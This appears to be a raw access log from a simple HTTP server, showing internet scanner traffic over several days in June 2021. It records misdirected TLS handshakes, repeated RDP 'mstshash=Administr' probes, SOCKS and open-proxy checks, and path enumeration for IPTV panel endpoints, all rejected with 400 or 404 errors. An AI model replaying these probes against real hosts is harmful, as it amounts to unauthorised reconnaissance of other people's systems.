35.245.224.63 - - [03/Jun/2021 17:18:15] code 400, message Bad request syntax ('\x16\x03\x01\x01N\x01\x00\x01J\x03\x03\x16ú\x92;¤à\x12eX\x01\x17EãÒ8\x1f\x91R,Ã¤\x0bæÐ\x9dp\'_ã\x8d·B )ÓR"î\x9etÙÒY\x07¨¿»ZÆ"+?áK¼D¨à\x15ãä×\x1e/\x18\x00v\x13\x02\x13\x03\x13\x01À/À+À0À,\x00\x9eÀ\'\x00gÀ(\x00k\x00£\x00\x9fÌ©Ì¨ÌªÀ¯À\xadÀ£À\x9fÀ]ÀaÀWÀS\x00¢À®À¬À¢À\x9eÀ\\À`ÀVÀRÀ$\x00jÀ#\x00@À')
35.245.224.63 - - [03/Jun/2021 17:18:15] "[35m[1mN Jú;¤àeXEãÒ8R,Ã¤æÐp'_ã·B )ÓR"îtÙÒY¨¿»ZÆ"+?áK¼D¨àãä×/ vÀ/À+À0À, À' gÀ( k £ Ì©Ì¨ÌªÀ¯À­À£ÀÀ]ÀaÀWÀS ¢À®À¬À¢ÀÀ\À`ÀVÀRÀ$ jÀ# @À[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [03/Jun/2021 22:35:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [03/Jun/2021 22:35:58] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [03/Jun/2021 22:59:44] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [03/Jun/2021 22:59:44] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
165.22.177.176 - - [03/Jun/2021 23:25:15] "[33mGET / HTTP/1.1[0m" 404 -
192.241.204.186 - - [04/Jun/2021 00:49:11] code 400, message Bad request version ('À\x14À')
192.241.204.186 - - [04/Jun/2021 00:49:11] "[35m[1m   VW\ÿÌÅ¯cÞ¨Lá9,ì³½*b@3Æûc  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
162.243.166.37 - - [04/Jun/2021 09:00:32] "[33mHEAD / HTTP/1.0[0m" 404 -
162.243.166.37 - - [04/Jun/2021 09:00:33] "[33mGET /system_api.php HTTP/1.1[0m" 404 -
162.243.166.37 - - [04/Jun/2021 09:00:35] "[33mGET /system_api.php HTTP/1.1[0m" 404 -
162.243.166.37 - - [04/Jun/2021 09:00:37] "[33mGET /c/version.js HTTP/1.1[0m" 404 -
162.243.166.37 - - [04/Jun/2021 09:00:39] "[33mGET /streaming/clients_live.php HTTP/1.1[0m" 404 -
162.243.166.37 - - [04/Jun/2021 09:00:41] "[33mGET /stalker_portal/c/version.js HTTP/1.1[0m" 404 -
162.243.166.37 - - [04/Jun/2021 09:00:43] "[33mGET /client_area/ HTTP/1.1[0m" 404 -
162.243.166.37 - - [04/Jun/2021 09:00:46] "[33mGET /stalker_portal/c/ HTTP/1.1[0m" 404 -
162.243.166.37 - - [04/Jun/2021 09:00:48] "[33mGET /stream/live.php HTTP/1.1[0m" 404 -
111.7.96.144 - - [04/Jun/2021 09:50:23] code 400, message Bad request version ('\x00/\x00')
111.7.96.144 - - [04/Jun/2021 09:50:23] "[35m[1m  i  eU§ärandom1random2random3random4   / [0m" HTTPStatus.BAD_REQUEST -
111.7.96.144 - - [04/Jun/2021 10:13:04] code 400, message Bad request syntax ('\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G×÷º,îê²`~ó\x00ý\x82{¹Õ\x96Èw\x9bæÄÛ<=Ûoï\x10n\x00\x00(\x00\x16\x00\x13\x00')
111.7.96.144 - - [04/Jun/2021 10:13:04] "[35m[1m  S  O ?G×÷º,îê²`~ó ý{¹ÕÈwæÄÛ<=Ûoïn  (   [0m" HTTPStatus.BAD_REQUEST -
183.136.225.14 - - [04/Jun/2021 10:44:44] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [04/Jun/2021 10:44:44] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [04/Jun/2021 10:44:44] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
111.7.96.144 - - [04/Jun/2021 11:03:49] "[33mGET / HTTP/1.0[0m" 404 -
111.7.96.144 - - [04/Jun/2021 11:42:42] "[33mHEAD / HTTP/1.1[0m" 404 -
111.7.96.144 - - [04/Jun/2021 11:42:42] "[33mGET / HTTP/1.1[0m" 404 -
111.7.96.144 - - [04/Jun/2021 11:42:42] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
45.155.205.209 - - [04/Jun/2021 14:32:29] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [04/Jun/2021 14:32:29] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [04/Jun/2021 15:10:35] code 400, message Bad request syntax ('{\x01\x00\x1615888888888À¨\x90Á\x13\x8a{')
161.189.192.94 - - [04/Jun/2021 15:10:35] "[35m[1m{ 15888888888À¨Á{[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [04/Jun/2021 15:13:56] code 400, message Bad HTTP/0.9 request type ('xx')
161.189.134.11 - - [04/Jun/2021 15:13:56] "[35m[1mxxSA52b -[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [04/Jun/2021 15:18:04] code 400, message Bad request syntax ('&&&&~\x04»8ÅaýT\x07P.VJÃ\x04;\x13\x0600-0C-29-B1-35-79')
161.189.192.94 - - [04/Jun/2021 15:18:04] "[35m[1m&&&&~»8ÅaýTP.VJÃ;00-0C-29-B1-35-79[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [04/Jun/2021 15:27:40] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x01.\x05\x00\x00\x00\x00\x81I¨À\x00\x0c)\x83z»\x01\x00zÚf\x00\x8d\x16Ò~\x9dU\x05ñ\x1fi»©\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ÃÐ¢|¦v½ó\x1eOÑËÜ®Ëd')
161.189.192.94 - - [04/Jun/2021 15:27:40] "[35m[1m   TZ         .    I¨À )z» zÚf Ò~Uñi»©                ÃÐ¢|¦v½óOÑËÜ®Ëd[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [04/Jun/2021 15:30:27] code 400, message Bad request syntax ('~\x00\x02\x00\x00\x01\x88\x88\x88\x88\x88\x03¥-~')
161.189.134.11 - - [04/Jun/2021 15:30:27] "[35m[1m~   ¥-~[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [04/Jun/2021 15:34:13] code 400, message Bad request syntax ('[\x00\x00\x00H\x00\x00\x00\x01\x10\x01\x00\x01\x04j\x00\x00\x01\x00\x00\x00\x00')
161.189.134.11 - - [04/Jun/2021 15:34:13] "[35m[1m[   H    j      [0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [04/Jun/2021 15:38:40] code 400, message Bad HTTP/0.9 request type ('\x02¤Uÿ\x00\x00\x00')
161.189.192.94 - - [04/Jun/2021 15:38:40] "[35m[1m¤Uÿ   [0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [04/Jun/2021 15:43:55] code 400, message Bad request syntax ('~~\x01\x00\x124Vx\x124/\x00\x08\x02\x00\x03Y\x10\x11\x15Q\x11\x03kÊ')
161.189.192.94 - - [04/Jun/2021 15:43:55] "[35m[1m~~ 4Vx4/  YQkÊ[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [04/Jun/2021 15:46:50] code 400, message Bad request syntax ('333766643833656338616434363333643963363962386536653538383937393235613033653338636434')
161.189.192.94 - - [04/Jun/2021 15:46:50] "[35m[1m333766643833656338616434363333643963363962386536653538383937393235613033653338636434[0m" HTTPStatus.BAD_REQUEST -
195.3.147.58 - - [04/Jun/2021 15:53:21] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
195.3.147.58 - - [04/Jun/2021 15:53:21] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [04/Jun/2021 17:06:31] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [04/Jun/2021 17:06:31] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [04/Jun/2021 17:07:53] code 400, message Bad request syntax ('\x04\x01\x00Pg)§ê\x00')
47.241.193.60 - - [04/Jun/2021 17:07:53] "[35m[1m Pg)§ê [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [04/Jun/2021 17:08:01] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
128.14.209.162 - - [04/Jun/2021 19:43:42] "[33mGET / HTTP/1.1[0m" 404 -
195.3.147.58 - - [04/Jun/2021 19:58:59] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
195.3.147.58 - - [04/Jun/2021 19:58:59] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
118.126.124.7 - - [04/Jun/2021 22:41:38] "[33mGET / HTTP/1.1[0m" 404 -
118.126.124.74 - - [05/Jun/2021 02:32:01] "[33mGET / HTTP/1.1[0m" 404 -
222.175.201.150 - - [05/Jun/2021 05:42:21] "[33mGET / HTTP/1.1[0m" 404 -
64.62.197.92 - - [05/Jun/2021 08:04:30] "[33mGET / HTTP/1.1[0m" 404 -
101.251.200.219 - - [05/Jun/2021 08:59:58] code 400, message Bad request version ('\x10çà\x81\x00\x00\x88À0À,À(À$À\x14À')
101.251.200.219 - - [05/Jun/2021 08:59:58] "[35m[1m" PxÐF%ø²\|'Î1E;Å¤C°çà  À0À,À(À$ÀÀ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [05/Jun/2021 08:59:58] code 400, message Bad request version ('Õ\x15ú¦½?\x11í\x90¾\x84r¬\x9c\x9b_êh\x00\x00\x88À0À,À(À$À\x14À')
101.251.200.219 - - [05/Jun/2021 08:59:58] "[35m[1m" ð4Vïv/ÚaÁ»Õú¦½?í¾r¬_êh  À0À,À(À$ÀÀ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [05/Jun/2021 08:59:59] code 400, message Bad request version ('\x00\x00PÀ\x14À')
101.251.200.219 - - [05/Jun/2021 08:59:59] "[35m[1m Æ  ÂuýiÔO=ÏCä¡Ü|~îPøm9  PÀÀ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [05/Jun/2021 08:59:59] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Æ\x01\x00\x00Â\x03\x01\x87²=\x99\x8bÂ+¡¶Ë>Lù@¨\x9c\x8d¯ã¬-9')
101.251.200.219 - - [05/Jun/2021 08:59:59] "[35m[1m Æ  Â²=Â+¡¶Ë>Lù@¨¯ã¬-9 üá6¾hd  PÀÀ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [05/Jun/2021 08:59:59] "[33mGET / HTTP/1.1[0m" 404 -
193.37.255.114 - - [05/Jun/2021 09:03:43] "[33mGET / HTTP/1.1[0m" 404 -
193.37.255.114 - - [05/Jun/2021 09:03:44] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
34.78.249.119 - - [05/Jun/2021 09:03:53] "[33mGET / HTTP/1.1[0m" 404 -
193.37.255.114 - - [05/Jun/2021 09:03:56] code 400, message Bad request syntax ('\x03qÍº`\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
193.37.255.114 - - [05/Jun/2021 09:03:56] "[35m[1mqÍº`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            [0m" HTTPStatus.BAD_REQUEST -
125.64.94.138 - - [05/Jun/2021 11:28:33] code 400, message Bad HTTP/0.9 request type ('\\x01\\x00\\x00\\x00')
125.64.94.138 - - [05/Jun/2021 11:28:33] "[35m[1m\x01\x00\x00\x00 \xbf\x02\x00\x88\x13\x00\x00\x87\x00\x00\x00NIMABIJIAN\x04\x03\x00\x00{\x99Caig\x9c\x03\xc7eB\xc5\t\xc1\x18a\x11\x1a\x91\x1f\x02\tcof\x91\xc0\x80sJ5\xd2\x80\xe6\x9a~\xb9\xc7\x83^\x96\xeeN\x16\x96\x96&\xe6\x03\xea\xbc\x81\x02=\xac\x10\xfa?7\x03\xc3\xdf\xf7\xe4\x98`p\xe6\x8d\xc1\xa9\x8d\xc6\x06\xdb\xaf\x91\xe7\x82s\xf7\x14H\xd4\xe1W\x9a\x93C\x9e]\xa4\x01#\x03#\x03]\x03c]CC\x05C\x03+S\x03b\xf4\x00\x00/\x9e\x16E[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [05/Jun/2021 12:46:01] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [05/Jun/2021 12:46:01] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [05/Jun/2021 13:04:02] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [05/Jun/2021 13:04:02] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [05/Jun/2021 14:08:41] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [05/Jun/2021 14:08:41] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [05/Jun/2021 15:15:45] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [05/Jun/2021 15:15:45] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [05/Jun/2021 15:48:03] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [05/Jun/2021 15:48:03] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [05/Jun/2021 16:36:55] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [05/Jun/2021 16:36:55] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [05/Jun/2021 19:23:20] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [05/Jun/2021 19:23:20] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [05/Jun/2021 19:56:12] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [05/Jun/2021 19:56:12] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [05/Jun/2021 20:01:30] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [05/Jun/2021 20:01:30] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [05/Jun/2021 20:05:48] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [05/Jun/2021 20:05:48] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [05/Jun/2021 20:10:30] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [05/Jun/2021 20:10:30] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
185.202.2.149 - - [05/Jun/2021 20:41:33] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [05/Jun/2021 20:41:33] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
199.195.252.133 - - [05/Jun/2021 21:45:22] "[33mGET / HTTP/1.1[0m" 404 -
185.220.205.106 - - [06/Jun/2021 00:13:38] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00u\x01\x00\x00q\x03\x03ÚðZ-°õöL=û¼öê\x14>§\x19^^\x12£4\x93å\x87.'\x8f+g`ë\x00\x00\x1aÀ/À+À\x11À\x07À\x13À")
185.220.205.106 - - [06/Jun/2021 00:13:38] "[35m[1m u  qÚðZ-°õöL=û¼öê>§^^£4å.'+g`ë  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
185.173.35.61 - - [06/Jun/2021 01:30:48] "[33mGET / HTTP/1.1[0m" 404 -
162.142.125.39 - - [06/Jun/2021 02:28:32] "[33mGET / HTTP/1.1[0m" 404 -
185.180.143.14 - - [06/Jun/2021 02:42:40] "[33mGET / HTTP/1.1[0m" 404 -
162.142.125.38 - - [06/Jun/2021 03:02:44] "[33mGET / HTTP/1.1[0m" 404 -
162.142.125.38 - - [06/Jun/2021 03:02:45] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [06/Jun/2021 05:33:42] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [06/Jun/2021 05:33:42] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [06/Jun/2021 07:49:15] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [06/Jun/2021 07:49:15] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
74.82.47.5 - - [06/Jun/2021 08:11:18] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [06/Jun/2021 10:15:34] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [06/Jun/2021 10:15:34] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [06/Jun/2021 10:54:33] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [06/Jun/2021 10:54:33] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [06/Jun/2021 11:09:49] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [06/Jun/2021 11:10:39] code 400, message Bad request syntax ('\x04\x01\x00Pg)§ê\x00')
47.241.193.60 - - [06/Jun/2021 11:10:39] "[35m[1m Pg)§ê [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [06/Jun/2021 11:10:58] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [06/Jun/2021 11:10:58] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [06/Jun/2021 11:44:15] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [06/Jun/2021 11:44:15] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [06/Jun/2021 16:08:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
89.248.165.107 - - [06/Jun/2021 16:08:11] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.107 - - [06/Jun/2021 16:31:01] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
